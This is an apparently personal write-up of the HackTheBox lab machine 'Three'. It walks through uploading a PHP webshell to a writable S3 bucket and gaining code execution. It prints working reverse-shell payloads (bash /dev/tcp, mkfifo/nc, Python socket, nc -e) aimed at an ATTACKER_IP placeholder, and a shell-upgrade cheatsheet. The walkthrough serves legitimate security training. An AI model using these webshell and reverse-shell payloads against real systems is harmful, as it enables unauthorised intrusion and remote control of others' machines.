# Three - HTB Starting Point

## Info
| Property | Value |
|----------|-------|
| Platform | HackTheBox Starting Point |
| Difficulty | Very Easy |
| OS | Linux |
| IP | 10.129.x.x |
| Date | 2026-03-09 |
| Status | In Progress |

---

## Key Concepts Learned

### What is S3?

**S3 (Simple Storage Service)** is Amazon's cloud storage service. Files are stored in **buckets**.

```
S3 Bucket Structure:
├── bucket-name/
│   ├── images/
│   ├── index.php
│   └── uploads/
```

**Key point:** If a website serves files from an S3 bucket AND you have write access, you can upload malicious files!

### Virtual Hosts (vhosts)

Same IP can host multiple websites. The server decides which site to serve based on the **Host header**:

```
10.129.x.x with Host: thetoppers.htb     → Main website (executes PHP)
10.129.x.x with Host: s3.thetoppers.htb  → S3 storage (stores files)
```

**That's why both domains point to the same IP but behave differently!**

---

## Reconnaissance

### Nmap Scan
```bash
nmap -sC -sV -oA nmap/three 10.129.x.x
```

**Open Ports:**
| Port | Service | Notes |
|------|---------|-------|
| 22 | SSH | OpenSSH |
| 80 | HTTP | Web server |

### Web Enumeration

Visiting `http://10.129.x.x` shows: `{"status": "running"}`

**Subdomain discovery** found: `s3.thetoppers.htb`

**Add to /etc/hosts:**
```bash
echo "10.129.x.x    thetoppers.htb s3.thetoppers.htb" | sudo tee -a /etc/hosts
```

---

## Exploitation

### The Attack Chain

```
Find S3 bucket → Test write access → Upload PHP webshell → RCE → Reverse shell
```

### Step 1: Configure AWS CLI

```bash
aws configure
```

Enter dummy credentials (anything works for this misconfigured S3):
```
AWS Access Key ID: temp
AWS Secret Access Key: temp
Default region name: us-east-1
Default output format: json
```

### Step 2: List S3 Buckets

```bash
aws s3 ls --endpoint-url=http://s3.thetoppers.htb
```

Output shows bucket: `thetoppers.htb`

### Step 3: Explore Bucket Contents

```bash
aws s3 ls s3://thetoppers.htb --endpoint-url=http://s3.thetoppers.htb
```

### Step 4: Upload PHP Webshell

Create webshell:
```bash
echo '<?php system($_GET["cmd"]); ?>' > webshell.php
```

Upload to bucket:
```bash
aws s3 cp webshell.php s3://thetoppers.htb/ --endpoint-url=http://s3.thetoppers.htb
```

### Step 5: Test RCE

Access via **main website** (not S3!):
```
http://thetoppers.htb/webshell.php?cmd=whoami
http://thetoppers.htb/webshell.php?cmd=id
http://thetoppers.htb/webshell.php?cmd=ls -la
```

---

## Reverse Shell with Netcat (nc)

### Understanding Netcat Reverse Shell

**Netcat (nc)** is a networking tool that can read/write data across network connections.

**Reverse shell concept:**
```
[Your Machine: Listener]  ←──────  [Target: Connects back]
     nc -nvlp 4444         ←──────  target runs shell command
```

The TARGET connects to YOU (reverse), not you connecting to target.

### Step 1: Start Listener on Your Machine

```bash
nc -nvlp 4444
```

**Flags explained:**
| Flag | Meaning |
|------|---------|
| `-n` | No DNS lookup (faster, use IP directly) |
| `-v` | Verbose (show connection info) |
| `-l` | Listen mode (wait for incoming connection) |
| `-p 4444` | Port to listen on |

**This terminal will wait until target connects!**

### Step 2: Trigger Reverse Shell from Target

**Bash reverse shell payload:**
```bash
bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
```

**Breaking it down:**

| Part | Meaning |
|------|---------|
| `bash -c '...'` | Run the following command in bash |
| `bash -i` | Start interactive bash shell |
| `>&` | Redirect stdout AND stderr |
| `/dev/tcp/IP/PORT` | Special bash file that opens TCP connection |
| `0>&1` | Redirect stdin to same place as stdout |

**The full flow:**
```
1. bash -i          → Start interactive shell
2. >& /dev/tcp/...  → Send all output to YOUR machine
3. 0>&1             → Also receive input from YOUR machine
```

### Step 3: URL Encode and Send

Special characters must be URL encoded:

| Character | Encoded |
|-----------|---------|
| space | `%20` |
| `&` | `%26` |
| `;` | `%3B` |
| `>` | `%3E` |
| `'` | `%27` |

**Full URL:**
```
http://thetoppers.htb/webshell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/YOUR_IP/4444%200%3E%261%27
```

### Alternative: mkfifo Reverse Shell

More complex but works when `/dev/tcp` isn't available:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc YOUR_IP 4444 > /tmp/f
```

**Breaking it down:**

| Part | Meaning |
|------|---------|
| `rm -f /tmp/f` | Remove pipe file if exists |
| `mkfifo /tmp/f` | Create named pipe (FIFO) |
| `cat /tmp/f` | Read from pipe |
| `\| /bin/bash -i` | Feed to interactive bash |
| `2>&1` | Redirect stderr to stdout |
| `\| nc YOUR_IP 4444` | Send output to your machine |
| `> /tmp/f` | Write your input back to pipe (loop!) |

**Visual flow:**
```
Your input → nc → /tmp/f → cat → bash → output → nc → Your screen
     ↑__________________________________________________|
```

---

## Post-Exploitation

### Find the Flag

```bash
# Search for flag files
find / -name "flag*" 2>/dev/null

# Common locations
cat /var/www/flag.txt
cat /root/flag.txt
cat /home/*/flag.txt
```

---

## AWS S3 CLI Cheatsheet

### Basic Commands

```bash
# Configure credentials
aws configure

# List all buckets
aws s3 ls --endpoint-url=http://s3.target.htb

# List bucket contents
aws s3 ls s3://bucket-name --endpoint-url=http://s3.target.htb

# Download file
aws s3 cp s3://bucket-name/file.txt . --endpoint-url=http://s3.target.htb

# Upload file
aws s3 cp shell.php s3://bucket-name/ --endpoint-url=http://s3.target.htb

# Download entire bucket
aws s3 sync s3://bucket-name ./local-folder --endpoint-url=http://s3.target.htb
```

### Key Points

- `--endpoint-url` is required for non-AWS S3 services
- Misconfigured buckets may allow anonymous read/write
- Always check both read AND write permissions

---

## Netcat Cheatsheet

### Listener (Your Machine)
```bash
nc -nvlp 4444
```

### Common Reverse Shells

**Bash:**
```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

**Python:**
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

**Netcat (if installed on target):**
```bash
nc -e /bin/bash ATTACKER_IP 4444
```

### Upgrading Shell to Interactive TTY

Once connected:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Lessons Learned

- **S3 buckets can be misconfigured** - check read/write access
- **Virtual hosts** - same IP can serve different content based on hostname
- **Webshells give RCE** - simple PHP one-liner can execute commands
- **Reverse shells** - target connects TO you, bypassing firewalls
- **URL encoding** - special characters must be encoded in URLs
- **nc listener** - always start BEFORE triggering the reverse shell

---

## Related Techniques

- [[Web-Shells]] - Different webshell types
- [[Shells-and-Payloads]] - More reverse shell methods
- [[AWS-Enumeration]] - Cloud security testing

---

**Tags:** #htb #linux #s3 #aws #webshell #reverse-shell #netcat #starting-point
